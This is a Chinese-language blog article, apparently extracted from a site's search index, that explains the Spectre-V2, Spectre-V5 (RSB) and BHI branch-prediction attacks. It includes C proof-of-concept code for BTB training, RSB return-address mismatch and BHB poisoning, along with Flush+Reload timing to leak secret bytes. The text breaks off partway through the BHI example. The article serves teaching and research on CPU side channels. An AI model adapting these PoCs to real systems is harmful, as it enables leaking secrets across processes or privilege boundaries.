<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>分支预测执行漏洞原理综述</title>
      <link href="/2026/01/18/fen-zhi-yu-ce-zhi-xing-lou-dong-yuan-li-zong-shu/"/>
      <url>/2026/01/18/fen-zhi-yu-ce-zhi-xing-lou-dong-yuan-li-zong-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="分支预测攻击及原理"><a href="#分支预测攻击及原理" class="headerlink" title="分支预测攻击及原理"></a>分支预测攻击及原理</h2><h3 id="Spectre-V2（Intel-ARM-AMD）"><a href="#Spectre-V2（Intel-ARM-AMD）" class="headerlink" title="Spectre-V2（Intel,ARM,AMD）"></a>Spectre-V2（Intel,ARM,AMD）</h3><ul><li>原理（目标微结构）<ul><li>主攻 BTB（以及与之相关的分支目标预测逻辑）和分支历史表。通过在攻击者上下文中“训练”预测器，使得当受害者执行间接分支（indirect call&#x2F;jmp）时，预测器会预测到攻击者指定的目标地址，从而让 CPU 在受害者上下文中短暂地在该目标上进行推测执行（执行 gadget）。</li></ul></li><li>攻击思路要点<ul><li>在同一物理核心上反复执行与受害者相近的分支历史序列，但把最后的目标地址指向攻击者准备的 gadget 地址（或映射出的等价虚拟地址低位）。</li><li>当受害者执行对应间接分支且分支解析遇延迟时（例如缓存未命中），CPU 会根据此前训练的 BTB 预测目标，于是会在受害者上下文上执行 gadget 的指令并产生微架构副作用（通常是缓存线被加载）。</li><li>攻击者随后用缓存侧信道或计时侧信道恢复秘密。</li></ul></li><li>所需条件 &#x2F; 限制<ul><li>能在与受害者共享相同分支预测状态的 CPU 执行训练（通常需在同一物理核上）；跨核通常无效。</li><li>受害者地址空间中存在可执行 gadget（共享库、系统 DLL、内核&#x2F;微码等）。</li><li>受害者的间接分支位置在预测时存在延迟（足够时间执行 gadget 指令）。</li></ul></li></ul><p>POC举例如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// --------------------------------------------------------------------------------</span><span class="token comment">// Gadget: 恶意的代码片段，训练时使用</span><span class="token comment">// --------------------------------------------------------------------------------</span><span class="token keyword">void</span> <span class="token function">gadget</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 关键点：这里的 *addr 是读取敏感数据</span>    <span class="token comment">// 然后将其乘以 512 映射到 probe_array 的特定页</span>    temp <span class="token operator">&amp;=</span> probe_array<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">*</span>addr<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 间接跳转的“正确”目标，探测时使用</span><span class="token keyword">void</span> <span class="token function">safe_function</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 随便做点无关紧要的事，或者空着</span>    <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token class-name">target_func_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 参数 target: 这是一个指针，指向下一条要执行的函数</span><span class="token comment">// 参数 data:  传递给函数的数据</span><span class="token keyword">void</span> <span class="token function">victim_function</span><span class="token punctuation">(</span><span class="token class-name">target_func_t</span> target<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// [关键点]：这是一个间接调用 (Indirect Call)</span>    <span class="token comment">// 汇编层面是：call *%rdi (或者类似寄存器)</span>    <span class="token comment">// CPU 必须从内存中读取 target 的值才能知道跳去哪。</span>    <span class="token comment">// 如果 target 不在 Cache 中，CPU 就会查 BTB 进行推测。</span>    <span class="token function">target</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    <span class="token keyword">int</span> mix_i<span class="token punctuation">;</span>    <span class="token keyword">volatile</span> <span class="token class-name">uint8_t</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> malicious_x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span>secret <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>probe_array<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这里的计算仅为演示，实际传入真实地址</span>    <span class="token keyword">int</span> score<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 统计每个字符命中缓存的次数</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>probe_array<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        probe_array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">// 开始攻击循环：尝试推测每一个字符</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> tries <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> tries <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> tries<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 尝试 1000 次以消除噪音</span>        <span class="token comment">// Step 1: 刷新探测数组 (Flush Probe Array)</span>        <span class="token comment">// 把 probe_array 从 CPU Cache 中清除，为了后续测量读取时间</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token function">_mm_clflush</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>probe_array<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Step 2: 训练 BTB (Train the BTB)</span>        <span class="token comment">// *在 POC 中*：我们可以直接传入 gadget 进行训练（模拟攻击者污染了 BTB）。</span>        <span class="token comment">// *在真实攻击中*：攻击者在自己的进程里，在相同的虚拟地址执行跳转到 gadget 的指令。</span>        <span class="token class-name">target_func_t</span> trained_target <span class="token operator">=</span> gadget<span class="token punctuation">;</span>         <span class="token class-name">target_func_t</span> true_target <span class="token operator">=</span> safe_function<span class="token punctuation">;</span>         <span class="token comment">// 5次训练 + 1次攻击</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">target_func_t</span> current_target<span class="token punctuation">;</span>            <span class="token keyword">char</span> <span class="token operator">*</span>current_data<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 【攻击回合】</span>                <span class="token comment">// 此时 CPU 的 BTB 已经被前 5 次训练成了 "去 gadget"</span>                <span class="token comment">// 但我们要传入 true_target，让 CPU 发现自己判断依据不在 Cache 里</span>                current_target <span class="token operator">=</span> true_target<span class="token punctuation">;</span>                current_data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>secret<span class="token punctuation">;</span> <span class="token comment">// 我们想窃取这个地址的数据</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 【训练回合】</span>                current_target <span class="token operator">=</span> trained_target<span class="token punctuation">;</span>                current_data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>temp<span class="token punctuation">;</span> <span class="token comment">// 随便给个无害地址</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// Step 3: 制造“推测窗口” (Create Speculative Window)</span>            <span class="token comment">// 我们必须把 current_target 这个变量从 Cache 中清除</span>            <span class="token comment">// 这样 CPU 必须去内存读 current_target 的值（很慢），</span>            <span class="token comment">// 在等待期间，它会根据 BTB（刚才被我们训练成 gadget 了）推测执行 gadget。</span>            <span class="token function">_mm_clflush</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>current_target<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// 这里的 current_target 虽然被 flush 了，但作为参数传递可能有寄存器缓存，实际攻击需注意</span>            <span class="token function">victim_function</span><span class="token punctuation">(</span>current_target<span class="token punctuation">,</span> current_data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Step 4: 测量时间 (Flush + Reload)</span>        <span class="token comment">// 扫描 256 个可能的字符</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> mix_i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">167</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token comment">// 乱序读取防止步进预测</span>            addr <span class="token operator">=</span> <span class="token operator">&amp;</span>probe_array<span class="token punctuation">[</span>mix_i <span class="token operator">*</span> <span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token keyword">unsigned</span> <span class="token keyword">int</span> junk <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token class-name">uint64_t</span> t1 <span class="token operator">=</span> <span class="token function">__rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>junk<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 读取时间戳</span>            <span class="token keyword">volatile</span> <span class="token class-name">uint8_t</span> tmp <span class="token operator">=</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span>  <span class="token comment">// 访问内存</span>            <span class="token class-name">uint64_t</span> t2 <span class="token operator">=</span> <span class="token function">__rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>junk<span class="token punctuation">)</span> <span class="token operator">-</span> t1<span class="token punctuation">;</span> <span class="token comment">// 计算耗时</span>            <span class="token comment">// 如果时间很短（&lt; 80 cycles），说明在 Cache 里</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>t2 <span class="token operator">&lt;=</span> <span class="token number">80</span> <span class="token operator">&amp;&amp;</span> mix_i <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 排除0因为可能是未初始化的干扰</span>                score<span class="token punctuation">[</span>mix_i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Step 5: 输出结果</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> runner_up <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>max <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> score<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> score<span class="token punctuation">[</span>max<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            runner_up <span class="token operator">=</span> max<span class="token punctuation">;</span>            max <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>runner_up <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> score<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> score<span class="token punctuation">[</span>runner_up<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            runner_up <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"推测结果: '%c' (score=%d), 次优: '%c' (score=%d)\n"</span><span class="token punctuation">,</span>            <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>max<span class="token punctuation">,</span> score<span class="token punctuation">[</span>max<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>runner_up<span class="token punctuation">,</span> score<span class="token punctuation">[</span>runner_up<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Spectre V2 POC Demo starting...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Target Secret: %s\n"</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="Spectre-V5-Intel"><a href="#Spectre-V5-Intel" class="headerlink" title="Spectre-V5(Intel)"></a>Spectre-V5(Intel)</h3><ul><li>原理（目标微结构）<ul><li>针对 RSB（Return Stack Buffer ）或与 return 预测有关的逻辑。RSB 用于预测函数 return 的目标（通过记录 call 的返回地址）。攻击者通过污染或诱导 RSB 下溢&#x2F;错误内容，使 CPU 在执行 return 时预测到攻击者希望的虚拟地址，从而在受害者上下文触发 gadget 的推测执行。</li></ul></li><li>攻击思路要点<ul><li>RSB 通常为有限深度的循环结构；当 RSB 下溢（例如深度不匹配或经过某些控制流）时，不同微架构会有不同回退策略（有些回退到 BTB）。攻击者利用这些回退行为或直接污染 RSB 的内容来控制返回的预测目标。</li><li>攻击方式包括：通过在攻击者线程构造类似的 call&#x2F;return 历史写入 RSB，或在上下文切换时让 RSB 下溢并使预测器回退到可控模式，从而影响 victim 的 return 预测。</li></ul></li><li>所需条件 &#x2F; 限制<ul><li>同样需要在与受害者共享 RSB 的执行上下文上运行（同核、超线程或顺序执行时留下 RSB 状态）。</li><li>目标 gadget 必须在受害者可执行的地址空间中。</li><li>不同 CPU 对 RSB 下溢的处理不同（有的用 BTB 回退），所以攻击效果依赖于具体微架构与微码。</li></ul></li></ul><p>POC示例，gadget手动清理栈帧，使得RSB上的返回地址与实际软件栈中的返回地址不匹配</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">gadget</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    __asm__ <span class="token keyword">volatile</span> <span class="token punctuation">(</span>        <span class="token string">"push %%rbp\n"</span>          <span class="token comment">// 保存栈基址</span>        <span class="token string">"mov %%rsp, %%rbp\n"</span>    <span class="token comment">// 设置当前栈基址</span>        <span class="token string">"pop %%rdi\n"</span>           <span class="token comment">// 移除栈中当前函数的返回地址（从 gadget 到 speculative）</span>        <span class="token string">"pop %%rdi\n"</span>           <span class="token comment">// 清理rbp</span>        <span class="token string">"pop %%rdi\n"</span>           <span class="token comment">// 更改返回地址为父函数返回地址（从 speculative 到 main）</span>        <span class="token string">"clflush (%%rsp)\n"</span>     <span class="token comment">// 刷新栈顶地址到内存，延长投机执行窗口</span>        <span class="token string">"cpuid\n"</span>               <span class="token comment">// 序列化指令，确保 clflush 执行完成</span>        <span class="token string">"pop %%rbp\n"</span>           <span class="token comment">// 同步修改栈底</span>        <span class="token string">"retq\n"</span>                <span class="token comment">// 触发投机执行：RSB 预测返回地址为 speculative 的第17行，但实际返回地址为main函数中的loop</span>    <span class="token operator">:</span> <span class="token operator">:</span> <span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">,</span> <span class="token string">"rdi"</span><span class="token punctuation">,</span> <span class="token string">"rbp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>投机执行函数中，按正常流程，将只执行第一条代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 投机执行函数：包含泄露敏感数据的 payload</span><span class="token keyword">void</span> <span class="token function">speculative</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> secret_ptr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">gadget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 调用 gadget 修改软件栈，制造地址不匹配</span>    <span class="token comment">// 后续不该被执行，但RSB预测会执行到此处</span>    <span class="token class-name">uint8_t</span> temp<span class="token punctuation">;</span>    <span class="token class-name">uint8_t</span> secret <span class="token operator">=</span> <span class="token operator">*</span>secret_ptr<span class="token punctuation">;</span>  <span class="token comment">// 投机读取敏感数据（正常执行时会被撤销）</span>    temp <span class="token operator">&amp;=</span> Array<span class="token punctuation">[</span>secret <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>temp<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面给出调用此函数的攻击流程</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Flush+Reload 侧信道测量：检测缓存命中（泄露敏感数据）</span><span class="token class-name">uint8_t</span> <span class="token function">leak_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">uint8_t</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> min_time <span class="token operator">=</span> UINT64_MAX<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> start<span class="token punctuation">,</span> end<span class="token punctuation">;</span>    <span class="token comment">// 1. 预先刷新 Array 所有缓存行</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ARRAY_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">_mm_clflush</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Array<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 2. 触发攻击：调用 speculative 函数，触发投机执行</span>    <span class="token function">speculative</span><span class="token punctuation">(</span>secret_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 3. 测量每个缓存行的访问时间：命中则时间短（对应泄露的 secret 值）</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ARRAY_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        start <span class="token operator">=</span> <span class="token function">_rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 开始计时（序列化指令）</span>        <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>Array<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment">// 访问目标缓存行</span>        end <span class="token operator">=</span> <span class="token function">_rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 结束计时</span>        <span class="token function">_mm_clflush</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Array<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 再次刷新，避免干扰下次测量</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start <span class="token operator">&lt;</span> min_time<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            min_time <span class="token operator">=</span> end <span class="token operator">-</span> start<span class="token punctuation">;</span>            result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token punctuation">)</span>i<span class="token punctuation">;</span>    <span class="token comment">// 缓存命中的索引即为泄露的 secret 值</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="BHI-Intel-ARM"><a href="#BHI-Intel-ARM" class="headerlink" title="BHI(Intel,ARM)"></a>BHI(Intel,ARM)</h3><ul><li>原理（目标微结构）<ul><li>目标是分支历史缓冲（BHB）或模式历史表（BHT&#x2F;PHT）：这些结构存储了先前分支的“taken&#x2F;not-taken”历史或以分支地址&#x2F;历史为索引的预测器状态。通过注入（设置）特定的历史位或历史序列，攻击者改变后续分支的预测决策，从而间接影响推测执行路径。</li></ul></li><li>攻击思路要点<ul><li>与 BTB 污染不同，BHI 利用分支行为（分支是否 taken）历史序列作为输入来影响预测。攻击者在同核上执行与受害者相同或相似的历史序列以“写入”历史状态。</li><li>通过控制历史位，攻击者能把受害者的条件分支预测为 taken 或 not‑taken，使受害者短暂执行某个推测分支（gadget）或跳过它。</li></ul></li><li>所需条件 &#x2F; 限制<ul><li>需要能在同核上通过一系列条件分支运行来建立期望的历史位模式。</li><li>成功的映射依赖于预测器如何索引历史（有的用最近若干分支的目标地址低位与方向位混合）。不同 CPU 将影响训练的复杂程度（需要逆向&#x2F;试探定位哪些位有用）。</li></ul></li></ul><p>Ps：看似与V1的攻击方式相像，实则原理不一样。该攻击手段是针对现有V2防护的盲点。通过执行一系列给定的预测序列，来覆盖现有的BHB，从而引导下一分支的方向预测</p><p>存在变体：BPI（分支特权注入），原理差不多，区别主要在于受害者的权限状态</p><p>POC示例：污染函数通过一系列的分支判断，将BHB覆盖为指定01序列,</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">poison_bhb_xor</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> history<span class="token punctuation">,</span> <span class="token keyword">int</span> bits<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> bits<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// volatile防止编译器优化掉分支</span>        <span class="token keyword">volatile</span> <span class="token keyword">int</span> branch <span class="token operator">=</span> history<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>branch<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token operator">::</span><span class="token operator">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// dummy分支，或插入其它行为</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token operator">::</span><span class="token operator">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>受害者函数调用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">victim_gadget</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> idx<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>target_func<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">uintptr_t</span> pc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uintptr_t</span><span class="token punctuation">)</span>target_func<span class="token punctuation">;</span> <span class="token comment">// 实际攻击需精细控制目标分支地址</span>    <span class="token comment">// 通过前期训练，使得此处BHB预测倾向为true</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> PROBE_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">uint8_t</span> value <span class="token operator">=</span> secret<span class="token punctuation">;</span>        probe_array<span class="token punctuation">[</span>value <span class="token operator">*</span> PAGE_SIZE<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主攻击流程</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 1. 保证攻击者和victim运行在同核</span>    <span class="token function">pin_to_core</span><span class="token punctuation">(</span>cpu_core<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 2. 动态或逆向/经验选择分支历史序列</span>    <span class="token comment">// 假定gshare预测, PC XOR GHR能落到chosen PHT entry（可动态fuzz或测量得最佳history）</span>    <span class="token class-name">uint8_t</span> best_history<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token 